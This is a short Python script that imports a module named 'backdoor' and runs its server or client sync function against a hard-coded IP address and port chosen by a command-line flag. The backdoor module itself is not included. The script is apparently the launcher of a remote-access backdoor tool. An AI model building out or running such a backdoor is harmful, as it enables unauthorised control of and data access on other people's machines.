import backdoor as back
import sys

IP="192.168.43.86"
PORT=5897
argv=sys.argv

if argv[1] == "--server":
    back.sync_from_server(argv[2],IP,PORT)
elif argv[1] == "--client":
    back.sync_from_client(argv[2],IP,PORT)
